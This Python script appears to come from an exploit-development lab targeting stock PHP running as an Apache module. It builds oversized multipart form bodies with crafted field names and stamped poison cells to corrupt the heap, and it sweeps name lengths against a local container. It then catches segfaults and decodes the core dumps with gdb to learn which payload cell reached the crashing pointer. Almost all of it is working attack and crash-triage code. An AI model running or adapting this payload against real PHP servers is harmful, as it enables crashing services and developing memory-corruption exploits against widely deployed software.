#!/usr/bin/env python3
"""oom62: GEOMETRY SWEEP against PURE STOCK mod_php.

oom61: instrument-tuned body (NAMELEN=3064, prep=3) does NOT crash stock.
The W2 .so is 25MB bigger -> different mmap/heap layout -> poison lands
elsewhere. The walk is stock code; we just lost the aiming solution.

Sweep: NAMELEN across 2500..3700 (step 100), prep=3, k1=2044, one fire
each, same server run. Distinct stamp_base per variant so a crash's
si_addr ASCII reveals WHICH cell landed in the walked slot. Stop early
on first segv; pull core + gdb decode with stock libphp on phpbuild.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
CELLS = 10237


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(namelen, i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (namelen - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(namelen, n, stamp_offset):
    # 16-byte cells; last cell padded to fit exactly: name = 'q' + cells + seq
    total = namelen - 1 - 6  # 'q' + %06d
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for _ in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    assert len(nm) == namelen, (len(nm), namelen)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(namelen, k1=2044, prep=3, stamp_base=0):
    ps = [key_part(namelen, i) for i in range(k1)]
    ps += [poison_part(namelen, n, stamp_base + n * CELLS) for n in range(prep)]
    ps += [key_part(namelen, i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=40):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code
    except Exception as e:
        return type(e).__name__


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def segv_count(logs):
    return len(re.findall(r"exit signal Segmentation", logs))


def main():
    print("=== [0] stock verify + conditions ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    print("[md5]", md5, flush=True)
    if md5 != STOCK_MD5:
        print("[ABORT]", flush=True)
        return
    dcp(PHPLAB + "/oomlab.ini", "php_vuln:/usr/local/etc/php/conf.d/30-oomlab.ini")
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=20600000" in probe:
            break
    print("[ini]", probe, flush=True)
    if "lim=20600000" not in probe:
        print("[ABORT]", flush=True)
        return

    base = segv_count(full_logs())
    print("[baseline] segv=%d" % base, flush=True)

    variants = [(nl, 2000000 * i) for i, nl in enumerate(range(2500, 3701, 100))]
    hit = None
    print("=== [1] sweep NAMELEN 2500..3700 ===", flush=True)
    for nl, sb in variants:
        t0 = time.time()
        att = build_attack(nl, stamp_base=sb)
        code = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
        time.sleep(2)
        n = segv_count(full_logs())
        cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
        print("  nl=%d: %s segv+=%d cores=%s (%.0fs)" % (nl, code, n - base, cores, time.time() - t0), flush=True)
        base = n
        if n > 0 and cores != "0":
            hit = (nl, sb)
            break

    if hit:
        nl, sb = hit
        print("=== [2] HIT at NAMELEN=%d — core decode ===" % nl, flush=True)
        corep = sh("ls -t /tmp/core* | head -1", 10)
        dcp("php_vuln:%s" % corep, PHPLAB + "/child.core.62.nl%d" % nl)
        dcp(PHPLAB + "/libphp.so.stock", "phpbuild:/tmp/libphp.stock.so")
        dcp(PHPLAB + "/child.core.62.nl%d" % nl, "phpbuild:/tmp/child.core.62")
        open("/tmp/g62.gdb", "w").write(
            "set pagination off\nbt 6\ninfo registers rip rdi rsi rax\n"
            "p $_siginfo._sifields._sigfault.si_addr\nx/2i $pc\n")
        r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                            "gdb -q -batch -x /tmp/g62.gdb /tmp/libphp.stock.so /tmp/child.core.62 2>&1 | tail -30"],
                           capture_output=True, timeout=180)
        out = r.stdout.decode("latin1", "replace")
        print(out, flush=True)
        m = re.search(r"si_addr.*=\s*(0x[0-9a-f]+)", out)
        if m:
            raw = int(m.group(1), 16).to_bytes(8, "little")
            digits = re.findall(rb"[0-9a-f]{6}", raw)
            print("[si_addr ascii]", raw, "digits:", digits, flush=True)
            if digits:
                cell = int(digits[-1], 16)
                print("[cell index] 0x%x = %d" % (cell, cell), flush=True)
    else:
        print("=== [2] no hit in sweep ===", flush=True)

    print("=== [3] restore ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        http("/oom_sapi.php", timeout=5)
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)
    print("=== DONE hit=%s ===" % (hit,), flush=True)


if __name__ == "__main__":
    main()
